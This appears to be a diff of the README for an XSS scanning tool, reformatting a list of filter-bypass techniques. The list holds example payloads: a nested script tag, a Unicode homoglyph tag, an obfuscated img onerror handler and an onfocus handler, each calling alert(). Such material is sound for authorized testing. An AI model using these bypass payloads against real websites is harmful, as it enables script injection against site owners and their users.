@@ -145,9 +145,9 @@ A dedicated XSS tool that intelligently finds and exploits XSS vulnerabilities.
 Some websites may block basic payloads. Try bypass techniques:
  - Bypass Tags:
         <<script>alert('XSS');</script>
-Using Unicode Encoding:
+ - Using Unicode Encoding:
         <scrİpt>alert('XSS')</scrİpt>
-Using Obfuscation:
+ - Using Obfuscation:
         <img src=x onerror='javasc'+'ript:alert("XSS")'>
 Using Event Handlers:
         <input type="text" onfocus="alert('XSS')">
